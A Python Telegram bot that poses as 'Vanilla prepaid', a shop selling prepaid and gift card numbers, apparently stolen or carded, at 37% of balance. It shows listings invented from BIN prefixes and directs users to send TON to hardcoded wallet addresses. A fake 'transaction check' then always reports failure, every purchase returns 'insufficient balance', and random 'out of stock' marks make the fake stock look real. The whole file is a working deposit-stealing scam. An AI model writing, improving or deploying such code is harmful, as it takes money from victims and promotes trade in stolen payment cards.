import logging
import random
import string
import asyncio
import os
from datetime import datetime, time, timedelta
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import threading

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
PORT = int(os.environ.get("PORT", 8080))

app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({"status": "running", "message": "Bot is running!"})

@app.route('/health')
def health():
    return "OK", 200

CARD_BINS = {
    "USD": ["435880xx", "491277xx", "511332xx", "428313xx", "520356xx", "409758xx", "525362xx", "451129xx", "434340xx", "426370xx", "411810xx", "403446xx", "533621xx", "446317xx", "457824xx", "545660xx", "432465xx", "516612xx", "484718xx", "485246xx", "402372xx", "457851xx"],
    "CAD": ["533985xx", "461126xx"],
    "AUD": ["373778xx", "377935xx", "375163xx"]
}

CAD_BINS = ["533985xx", "461126xx"]
AUD_BINS = ["373778xx", "377935xx", "375163xx"]

FILTER_BIN_MAP = {
    "vanilla": ["411810xx", "409758xx", "520356xx", "525362xx", "484718xx", "545660xx"],
    "cardbalance": ["428313xx", "432465xx", "457824xx"],
    "walmart": ["485246xx"],
    "giftcardmall": ["451129xx", "403446xx", "435880xx", "511332xx"],
    "joker": ["533985xx", "461126xx"],
    "amex": ["373778xx", "377935xx", "375163xx"]
}

class StickerType(Enum):
    NONE = ""
    RELISTED = "🔄"
    GOOGLE = "🅶"
    PAYPAL = "🅿"

DEPOSIT_ADDRESSES = [
    "UQCgPsBnvSib5rYln5vK0rNfYo__xjfk5OD-0mKU7-n1ACnT",
    "UQCCTTF03CCeyNKov1azQty5iNcNMnwH72J7pcb7MUaDKXsd",
    "UQAZjMCIT6MEMUgvKmweTySPrGqxnUrgvG5JQVUfnR-d_tke",
    "UQBwwD_2VekRaM-7_6wwltzkboxbTiYDqif40G9Tbnq76Td1",
    "UQAMBt7k1FZHvewkpB1IHMLiOMLZR63rO_NKv-fiQ0n5EGW_",
    "UQC9OvldFlHMbxKRq-6yRTm9uWv-YWFcsywHQAZz6p9dtonc"
]

user_deposit_data = {}

@dataclass
class Card:
    card_number: str
    currency: str
    amount: float
    sticker: StickerType = StickerType.NONE
    is_registered: bool = True
    is_out_of_stock: bool = False

    def display(self) -> str:
        sticker_str = f" {self.sticker.value}" if self.sticker != StickerType.NONE else ""
        return f"{self.card_number} {self.currency}${self.amount:.2f} at 37%{sticker_str}"

@dataclass
class UserData:
    user_id: int
    username: str
    first_name: str
    ton_balance: float = 0.0
    usd_balance: float = 0.0
    total_deposits_ton: float = 0.0
    total_deposits_usd: float = 0.0
    last_deposit: str = "Never"
    purchase_count: int = 0
    usd_spent: float = 0.0
    purchased_cards: List[str] = field(default_factory=list)
    referrals_count: int = 0
    referred_by: str = ""
    referral_link: str = ""
    pending_deposit: Optional[Dict] = None

class CardGenerator:
    def __init__(self):
        self.cards: List[Card] = []
        self._last_update_time = None
        self._is_updating = False

    def _generate_unique_number(self, existing_numbers: set) -> str:
        while True:
            bin_list = []
            for currency, bins in CARD_BINS.items():
                bin_list.extend(bins)
            selected_bin = random.choice(bin_list)
            random_suffix = ''.join(random.choices(string.digits, k=2))
            card_num = selected_bin.replace('xx', random_suffix)
            if card_num not in existing_numbers:
                return card_num

    def _get_max_amount_for_bin(self, card_number: str) -> float:
        bin_prefix = card_number[:6] + 'xx'
        if bin_prefix in CAD_BINS:
            return 150.0
        elif bin_prefix in AUD_BINS:
            return 50.0
        else:
            return 500.0

    def _get_sticker_for_amount(self, amount: float) -> StickerType:
        if amount >= 300:
            return StickerType.NONE
        rand = random.random()
        if rand < 0.65:
            return StickerType.NONE
        elif rand < 0.75:
            return StickerType.RELISTED
        elif rand < 0.83:
            return StickerType.GOOGLE
        elif rand < 0.87:
            return StickerType.PAYPAL
        else:
            return StickerType.GOOGLE

    def _get_currency_for_bin(self, card_number: str) -> str:
        bin_prefix = card_number[:6] + 'xx'
        for currency, bins in CARD_BINS.items():
            if bin_prefix in bins:
                return currency
        return "USD"

    def generate_cards(self) -> List[Card]:
        total_cards = random.randint(200, 250)
        cards = []
        existing_numbers = set()
        existing_pairs = set()
        low_amount_count = random.randint(15, 20)
        high_amount_count = random.randint(10, min(12, total_cards // 10))
        medium_amount_count = random.randint(20, 30)
        remaining = total_cards - (low_amount_count + high_amount_count + medium_amount_count)
        aud_count = 0
        max_aud_cards = 20

        for _ in range(low_amount_count):
            amount = round(random.uniform(0.01, 0.98), 2)
            while True:
                card_num = self._generate_unique_number(existing_numbers)
                if (card_num, amount) not in existing_pairs:
                    max_amt = self._get_max_amount_for_bin(card_num)
                    if amount <= max_amt:
                        break
            existing_numbers.add(card_num)
            existing_pairs.add((card_num, amount))
            currency = self._get_currency_for_bin(card_num)
            sticker = self._get_sticker_for_amount(amount)
            cards.append(Card(card_num, currency, amount, sticker))

        for _ in range(high_amount_count):
            amount = round(random.uniform(300, 500), 2)
            while True:
                card_num = self._generate_unique_number(existing_numbers)
                if (card_num, amount) not in existing_pairs:
                    max_amt = self._get_max_amount_for_bin(card_num)
                    if amount <= max_amt:
                        break
            existing_numbers.add(card_num)
            existing_pairs.add((card_num, amount))
            currency = self._get_currency_for_bin(card_num)
            cards.append(Card(card_num, currency, amount, StickerType.NONE))

        for _ in range(medium_amount_count):
            amount = round(random.uniform(5, 40), 2)
            while True:
                card_num = self._generate_unique_number(existing_numbers)
                if (card_num, amount) not in existing_pairs:
                    max_amt = self._get_max_amount_for_bin(card_num)
                    if amount <= max_amt:
                        if card_num[:6] + 'xx' in AUD_BINS:
                            if aud_count >= max_aud_cards:
                                continue
                        break
            existing_numbers.add(card_num)
            existing_pairs.add((card_num, amount))
            if card_num[:6] + 'xx' in AUD_BINS:
                aud_count += 1
            currency = self._get_currency_for_bin(card_num)
            sticker = self._get_sticker_for_amount(amount)
            cards.append(Card(card_num, currency, amount, sticker))

        for _ in range(remaining):
            amount = round(random.uniform(5, 40), 2)
            while True:
                card_num = self._generate_unique_number(existing_numbers)
                if (card_num, amount) not in existing_pairs:
                    max_amt = self._get_max_amount_for_bin(card_num)
                    if amount <= max_amt:
                        if card_num[:6] + 'xx' in AUD_BINS:
                            if aud_count >= max_aud_cards:
                                continue
                        break
            existing_numbers.add(card_num)
            existing_pairs.add((card_num, amount))
            if card_num[:6] + 'xx' in AUD_BINS:
                aud_count += 1
            currency = self._get_currency_for_bin(card_num)
            sticker = self._get_sticker_for_amount(amount)
            cards.append(Card(card_num, currency, amount, sticker))

        cards.sort(key=lambda x: x.amount, reverse=True)
        unregistered_count = int(len(cards) * 0.2)
        cards_by_amount_desc = sorted(cards, key=lambda x: x.amount, reverse=True)
        for i in range(unregistered_count):
            cards_by_amount_desc[len(cards_by_amount_desc) - 1 - i].is_registered = False
        return cards

    async def update_cards(self):
        self._is_updating = True
        self.cards = self.generate_cards()
        self._last_update_time = datetime.now()
        self._is_updating = False
        print(f"Cards generated: {len(self.cards)} cards")

    def mark_random_cards_out_of_stock(self, percentage: float = 3.0):
        available_cards = [c for c in self.cards if not c.is_out_of_stock]
        if not available_cards:
            return 0
        count = max(1, int(len(self.cards) * percentage / 100))
        count = min(count, len(available_cards))
        selected = random.sample(available_cards, count)
        for card in selected:
            card.is_out_of_stock = True
        print(f"Marked {count} cards as OUT OF STOCK (Total OUT OF STOCK: {len([c for c in self.cards if c.is_out_of_stock])})")
        return count

    def get_cards_paginated(self, page: int, per_page: int = 10, filter_type: str = None) -> Tuple[List[Card], int]:
        if not self.cards:
            return [], 0
        filtered_cards = self.cards.copy()
        if filter_type:
            if filter_type == "unregistered":
                filtered_cards = [c for c in filtered_cards if not c.is_registered]
            elif filter_type == "registered":
                filtered_cards = [c for c in filtered_cards if c.is_registered]
            elif filter_type in FILTER_BIN_MAP:
                allowed_bins = FILTER_BIN_MAP[filter_type]
                filtered_cards = [c for c in filtered_cards if any(c.card_number.startswith(bin_prefix.replace('xx', '')) for bin_prefix in allowed_bins)]
        total_pages = max(1, (len(filtered_cards) + per_page - 1) // per_page)
        start = (page - 1) * per_page
        end = start + per_page
        return filtered_cards[start:end], total_pages

    def get_low_amount_cards_page(self, per_page: int = 10) -> Tuple[List[Card], int]:
        if not self.cards:
            return [], 0
        low_cards = [c for c in self.cards if c.amount < 0.99]
        total_pages = max(1, (len(low_cards) + per_page - 1) // per_page)
        return low_cards, total_pages


class UserManager:
    def __init__(self):
        self.users: Dict[int, UserData] = {}
        self.order_counter = 20990

    def get_or_create_user(self, update: Update) -> UserData:
        user = update.effective_user
        if user.id not in self.users:
            referral_link = f"https://t.me/YourBotUsername?start=ref_{user.id}"
            self.users[user.id] = UserData(
                user_id=user.id,
                username=user.username or "",
                first_name=user.first_name,
                referral_link=referral_link
            )
        return self.users[user.id]

    def get_next_order_number(self) -> int:
        self.order_counter += 1
        if self.order_counter > 1000060:
            self.order_counter = 20990
        return self.order_counter


class KeyboardBuilder:
    @staticmethod
    def get_main_menu_keyboard() -> InlineKeyboardMarkup:
        keyboard = [
            [
                InlineKeyboardButton("💳 Stock", callback_data="stock"),
                InlineKeyboardButton("📞 Contact Admin", url="https://t.me/Vanilagcm"),
                InlineKeyboardButton("🔍Card chake", url="https://t.me/card_chaker_bot")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)

    @staticmethod
    def get_filters_keyboard() -> InlineKeyboardMarkup:
        keyboard = [
            [InlineKeyboardButton("🔐 Unregistered", callback_data="filter_unregistered"), InlineKeyboardButton("🔓 Registered", callback_data="filter_registered")],
            [InlineKeyboardButton("⚪ Vanilla", callback_data="filter_vanilla"), InlineKeyboardButton("💠 CardBalance", callback_data="filter_cardbalance")],
            [InlineKeyboardButton("☀️ Walmart", callback_data="filter_walmart"), InlineKeyboardButton("🛍️ GiftCardMall", callback_data="filter_giftcardmall")],
            [InlineKeyboardButton("🎭 Joker", callback_data="filter_joker"), InlineKeyboardButton("🟦 AMEX", callback_data="filter_amex")],
            [InlineKeyboardButton("🏠 Clear Filters", callback_data="clear_filters")]
        ]
        return InlineKeyboardMarkup(keyboard)

    @staticmethod
    def get_deposit_keyboard() -> InlineKeyboardMarkup:
        keyboard = [
            [InlineKeyboardButton("Confirm ✅", callback_data="deposit_confirm")],
            [InlineKeyboardButton("Cancel ⛔", callback_data="deposit_cancel")],
            [InlineKeyboardButton("✆ Contact", url="https://t.me/Vanilagcm")]
        ]
        return InlineKeyboardMarkup(keyboard)

    @staticmethod
    def get_withdraw_keyboard() -> InlineKeyboardMarkup:
        keyboard = [
            [InlineKeyboardButton("Confirm ✅", callback_data="withdraw_confirm")],
            [InlineKeyboardButton("Cancel ⛔", callback_data="withdraw_cancel")]
        ]
        return InlineKeyboardMarkup(keyboard)


card_generator = CardGenerator()
user_manager = UserManager()
keyboard_builder = KeyboardBuilder()


async def is_update_time() -> bool:
    now = datetime.now()
    return now.hour == 3 and now.minute < 10


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_manager.get_or_create_user(update)
    welcome_text = (
        f"⚡️Welcome {user.first_name} to Vanilla prepaid! ⚡️\n\n"
        "Sell, Buy, and strike deals in seconds!!\n"
        "All transactions are secure and transparent.\n"
        "All types of cards are available here at best rates. Current rate is 37%"
    )
    await update.message.reply_text(welcome_text, reply_markup=keyboard_builder.get_main_menu_keyboard())


async def stock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_update_time():
        if update.callback_query:
            await update.callback_query.answer("The bot is currently updating, please wait", show_alert=True)
        else:
            await update.message.reply_text("The bot is currently updating, please wait")
        return

    if not card_generator.cards:
        await card_generator.update_cards()

    cards, total_pages = card_generator.get_cards_paginated(1)

    if not cards:
        await update.message.reply_text("No cards available at the moment. Please try again later.")
        return

    await send_listing_page(update, context, cards, 1, total_pages)


async def send_listing_page(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: List[Card], page: int, total_pages: int, filter_type: str = None):
    if not cards:
        if update.callback_query:
            await update.callback_query.edit_message_text("No cards available at the moment.")
        else:
            await update.message.reply_text("No cards available at the moment.")
        return

    user = user_manager.get_or_create_user(update)
    message_text = "⚡️ Vanilla prepaid - Main Listings V2 ⚡️\n\n"
    message_text += "Your Balance:\n"
    message_text += f"💵 USD: ${user.usd_balance:.2f}\n"
    message_text += f"• TON : {user.ton_balance:.6f} (${user.ton_balance * 2:.2f})\n\n"

    for i, card in enumerate(cards, 1):
        message_text += f"{i}. {card.card_number} {card.currency}${card.amount:.2f} at 37%"
        if card.sticker != StickerType.NONE:
            message_text += f" {card.sticker.value}"
        message_text += "\n"

    total_balance = sum(c.amount for c in cards)
    message_text += f"\nTotal Cards: {len(cards)} | Total Cards Balance: ${total_balance:.2f}\n"
    message_text += "Legend:\n🔄 = Re-listed\n🅶 = Used on Google\n🅿 = Used on PayPal\n\n"
    message_text += f"Filters: {filter_type or 'None'} \n"
    message_text += f"Page: {page}/{total_pages} | Updated: {datetime.now().strftime('%H:%M:%S')}"

    keyboard = []
    for i, card in enumerate(cards, 1):
        if card.is_out_of_stock:
            purchase_text = "⚠️ OUT OF STOCK"
            callback_data = f"outofstock_{card.card_number}"
        else:
            purchase_text = "🛒Purchase"
            callback_data = f"purchase_{card.card_number}"

        keyboard.append([
            InlineKeyboardButton(f"{i}. {card.card_number[:6]}xx", callback_data=f"card_{card.card_number}"),
            InlineKeyboardButton(purchase_text, callback_data=callback_data)
        ])

    nav_buttons = []
    if page > 1:
        nav_buttons.append(InlineKeyboardButton("First↩️", callback_data=f"page_1_{filter_type or ''}"))
        nav_buttons.append(InlineKeyboardButton("Back⬅️", callback_data=f"page_{page - 1}_{filter_type or ''}"))
    if page < total_pages:
        nav_buttons.append(InlineKeyboardButton("Next➡️", callback_data=f"page_{page + 1}_{filter_type or ''}"))
        nav_buttons.append(InlineKeyboardButton("Last↪️", callback_data=f"page_{total_pages}_{filter_type or ''}"))
    if nav_buttons:
        keyboard.append(nav_buttons)

    keyboard.append([
        InlineKeyboardButton("💰 Deposit", callback_data="deposit"),
        InlineKeyboardButton("Refresh🔂", callback_data=f"refresh_{page}_{filter_type or ''}"),
        InlineKeyboardButton("🔍 Filters", callback_data="show_filters")
    ])

    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.edit_message_text(message_text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(message_text, reply_markup=reply_markup)


async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    selected_address = random.choice(DEPOSIT_ADDRESSES)

    user_id = update.effective_user.id
    user_deposit_data[user_id] = {
        'address': selected_address,
        'amount': None,
        'txid': None,
        'status': 'waiting'
    }

    message = (
        f"⚡ Vanilla prepaid — TON DEPOSIT ⚡\n\n\n\n"
        f"Deposit Information: `{selected_address}`\n\n\n\n"
        "Minimum Deposit: `15 TON`\n"
        "Instructions:\n"
        "1. Send your deposit to the address above.\n"
        "2. Wait for 1 confirmation.\n"
        "3. Your balance will update automatically.\n"
        "4. Please remember to send TON only through the TON Network. ✅\n\n"
        "⚠️ WARNING:\n"
        "- Deposits below the minimum amount will not be processed.\n"
        "- This address is valid only for your account. Do not share it.\n\n"
        "⚠️ Note: This deposit session is only active for 30 minutes. Please send your deposit before it expires."
    )

    if update.callback_query:
        await update.callback_query.edit_message_text(message, reply_markup=keyboard_builder.get_deposit_keyboard(), parse_mode='Markdown')
    else:
        await update.message.reply_text(message, reply_markup=keyboard_builder.get_deposit_keyboard(), parse_mode='Markdown')


async def deposit_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Please enter the amount.......")
    context.user_data['awaiting_deposit_amount'] = True


async def deposit_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Deposit request has been canceled.❌\nYou can now create a new deposit request.✅")
    context.user_data.pop('awaiting_deposit_amount', None)
    context.user_data.pop('awaiting_txid', None)


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_deposit_amount'):
        try:
            amount = float(update.message.text.strip())
            if amount < 15:
                await update.message.reply_text("Minimum deposit is 15 TON. Please enter the correct amount like that 15, 16, 20")
                return

            user_id = update.effective_user.id
            if user_id in user_deposit_data:
                user_deposit_data[user_id]['amount'] = amount

            context.user_data['awaiting_deposit_amount'] = False
            context.user_data['awaiting_txid'] = True
            await update.message.reply_text("Submit withdraw Txid :")

        except ValueError:
            await update.message.reply_text("Please enter a valid number")

    elif context.user_data.get('awaiting_txid'):
        txid = update.message.text.strip()
        user_id = update.effective_user.id
        user = user_manager.get_or_create_user(update)

        deposit_data = user_deposit_data.get(user_id, {})
        amount = deposit_data.get('amount', 0)
        order_number = user_manager.get_next_order_number()

        context.user_data['awaiting_txid'] = False

        order_text = (
            f"NAME: `{user.first_name}`\n\n"
            f"AMOUNT: `{amount}` TON\n"
            f"Txid: `{txid}`\n"
            f"Order Number: `{order_number}`\n"
            f"Stats: Waiting...\n"
            f"TIME: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
            "NOTE: Balance will be added within 1/2 minutes. If not added, contact customer care."
        )

        keyboard = [[InlineKeyboardButton("✆ Contact", url="https://t.me/Vanilagcm")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        message = await update.message.reply_text(order_text, parse_mode='Markdown', reply_markup=reply_markup)

        asyncio.create_task(simulate_transaction_check(context, message.chat_id, message.message_id, order_text))


async def simulate_transaction_check(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, original_text: str):
    await asyncio.sleep(50)

    processing_text = original_text.replace("Stats: Waiting...", "Stats: Processing....")
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=processing_text,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error editing message: {e}")

    await asyncio.sleep(55)

    failed_text = processing_text.replace("Stats: Processing....", "Stats: transaction could not be found.")
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=failed_text,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error editing message: {e}")


async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data

    if data.startswith("purchase_"):
        await query.answer("⚠ Insufficient balance, please deposit", show_alert=True)
        return

    if data.startswith("outofstock_"):
        await query.answer("Sorry, the card is out of stock ⚠", show_alert=True)
        return

    await query.answer()

    if await is_update_time():
        await query.edit_message_text("The bot is currently updating, please wait")
        return

    if data.startswith("page_"):
        parts = data.split("_")
        page = int(parts[1])
        filter_type = parts[2] if len(parts) > 2 and parts[2] else None
        cards, total_pages = card_generator.get_cards_paginated(page, filter_type=filter_type if filter_type else None)
        await send_listing_page(update, context, cards, page, total_pages, filter_type)

    elif data.startswith("refresh_"):
        parts = data.split("_")
        page = int(parts[1])
        filter_type = parts[2] if len(parts) > 2 and parts[2] else None
        cards, total_pages = card_generator.get_cards_paginated(page, filter_type=filter_type if filter_type else None)
        await send_listing_page(update, context, cards, page, total_pages, filter_type)

    elif data == "stock":
        if not card_generator.cards:
            await card_generator.update_cards()
        cards, total_pages = card_generator.get_cards_paginated(1)
        if not cards:
            await query.edit_message_text("No cards available at the moment.")
            return
        await send_listing_page(update, context, cards, 1, total_pages)

    elif data == "show_filters":
        await query.edit_message_reply_markup(reply_markup=keyboard_builder.get_filters_keyboard())

    elif data.startswith("filter_"):
        filter_type = data.replace("filter_", "")
        cards, total_pages = card_generator.get_cards_paginated(1, filter_type=filter_type)
        await send_listing_page(update, context, cards, 1, total_pages, filter_type)

    elif data == "clear_filters":
        cards, total_pages = card_generator.get_cards_paginated(1)
        await send_listing_page(update, context, cards, 1, total_pages)

    elif data == "deposit":
        await deposit_command(update, context)

    elif data == "deposit_confirm":
        await deposit_confirm(update, context)

    elif data == "deposit_cancel":
        await deposit_cancel(update, context)

    elif data == "withdraw_confirm":
        user = user_manager.get_or_create_user(update)
        if user.ton_balance < 0.1:
            await query.edit_message_text("Insufficient balance")
        else:
            await query.edit_message_text("Withdrawal request submitted!")

    elif data == "withdraw_cancel":
        await query.delete_message()

    elif data.startswith("card_"):
        card_num = data.replace("card_", "")
        await query.answer(f"✅ Copied: {card_num}", show_alert=False)


async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_manager.get_or_create_user(update)
    last_cards_text = '\n  '.join(['• No cards purchased yet.'] if not user.purchased_cards else [f'• {c}' for c in user.purchased_cards[-3:]])
    profile_text = (
        f"⚡ Vanilla prepaid PROFILE ⚡\n\n"
        f"👤 {user.first_name}\n"
        f"🧠 It is impossible to love and to be wise.\n"
        f"💬 By: Francis Bacon\n\n"
        f"🆔 User ID: {user.user_id}\n"
        f"🔹 Username: @{user.username}\n"
        f"💰 TON Balance: {user.ton_balance:.10f}\n"
        f"💵 USD Total: ${user.usd_balance:.2f}\n\n"
        f"📥 Deposits\n"
        f"• Total: {user.total_deposits_ton:.4f} Ton\n"
        f"• USD: ${user.total_deposits_usd:.2f}\n"
        f"• Last: {user.last_deposit}\n\n"
        f"🛒 Purchases\n"
        f"• Count: {user.purchase_count}\n"
        f"• USD Spent: ${user.usd_spent:.2f}\n"
        f"• Last Cards:\n  {last_cards_text}\n\n"
        f"👥 Referrals\n"
        f"• Invited: {user.referrals_count}\n"
        f"• Referred By: {user.referral_link}\n\n"
        f"🛠 Permissions\n"
        f"• Vendor: ❌\n"
        f"• Re-list: ❌\n\n"
        f"Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    await update.message.reply_text(profile_text)


async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_manager.get_or_create_user(update)
    await update.message.reply_text(f"Your current balance: {user.ton_balance:.2f} TON")


async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_manager.get_or_create_user(update)
    text = (
        f"Your balance : {user.ton_balance:.5f} TON\n"
        f"Withdrawal amount : 0.0000 TON\n"
        f"Withdrawal fee : 0.01%"
    )
    await update.message.reply_text(text, reply_markup=keyboard_builder.get_withdraw_keyboard())


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("If you need help, please contact https://t.me/Vanilagcm")


async def refund_rules_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rules = (
        "⚡️⚡️⚡️ VERY IMPORTANT ⚡️⚡️⚡️\n"
        "💳 Vanilla prepaid – Refund Policy 💳\n\n"
        "✅✅✅ CARD REFUND REQUIREMENTS ✅✅✅\n"
        "1️⃣ Refund requests must be submitted within 25 minutes of purchase.\n"
        "2️⃣ Refunds are accepted ONLY if the card is stolen or partially used.\n"
        "3️⃣ You must have a valid Telegram username set.\n\n"
        "💬 Official Refund Support: https://t.me/Vanilagcm\n\n"
        "❌❌❌ AUTOMATIC REFUND REJECTIONS ❌❌❌\n"
        "🚫 No refund for ReListed cards\n"
        "🚫 No refund for cards used with Google / Google Pay\n"
        "🚫 No Telegram username = Auto rejection\n\n"
        "⚠️ IMPORTANT NOTICE: All cards are checked immediately before delivery\n"
        "📩 Need help? Contact support: https://t.me/VANILAExchange"
    )
    await update.message.reply_text(rules)


async def ref_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = user_manager.get_or_create_user(update)
    text = (
        f"🎉 REFERRAL PROGRAM\n\n"
        f"Invite friends and earn 5% every deposit each active referral!\n\n"
        f"🔗 Your unique link: {user.referral_link}\n\n"
        f"📊 Stats\n"
        f"• Total referrals: {user.referrals_count}\n"
        f"• Earned: $0.00\n\n"
        f"❗ Rules\n"
        f"- Bonus awarded when referral completes first transaction\n"
        f"- No self-referrals\n"
        f"- Fraudulent referrals will be banned"
    )
    await update.message.reply_text(text)


async def cents_listing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_update_time():
        await update.message.reply_text("The bot is currently updating, please wait")
        return
    if not card_generator.cards:
        await card_generator.update_cards()
    cards, total_pages = card_generator.get_low_amount_cards_page()
    await send_listing_page(update, context, cards, 1, total_pages, "Low Amount (<$0.99)")


async def scheduled_update(context: ContextTypes.DEFAULT_TYPE):
    await card_generator.update_cards()


async def auto_mark_out_of_stock(context: ContextTypes.DEFAULT_TYPE):
    if not card_generator.cards:
        return
    count = card_generator.mark_random_cards_out_of_stock(3.0)
    if count and count > 0:
        print(f"Auto OUT OF STOCK: {count} cards marked at {datetime.now()}")


async def main():
    print("Starting bot...")

    await card_generator.update_cards()
    print(f"Bot started with {len(card_generator.cards)} cards")

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("listings", stock_command))
    application.add_handler(CommandHandler("cents_listing", cents_listing))
    application.add_handler(CommandHandler("profile", profile_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("withdraw", withdraw_command))
    application.add_handler(CommandHandler("deposit", deposit_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("refund_rules", refund_rules_command))
    application.add_handler(CommandHandler("ref", ref_command))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(handle_callback))

    if application.job_queue:
        interval = random.randint(1800, 3600)
        application.job_queue.run_repeating(auto_mark_out_of_stock, interval=interval, first=interval)
        print(f"Auto OUT OF STOCK scheduled every {interval // 60} minutes")
        application.job_queue.run_daily(scheduled_update, time=time(hour=3, minute=0, second=0))

    print("Starting polling...")
    await application.initialize()
    await application.start()
    await application.updater.start_polling()

    while True:
        await asyncio.sleep(3600)


def start_flask():
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)


if __name__ == "__main__":
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped")
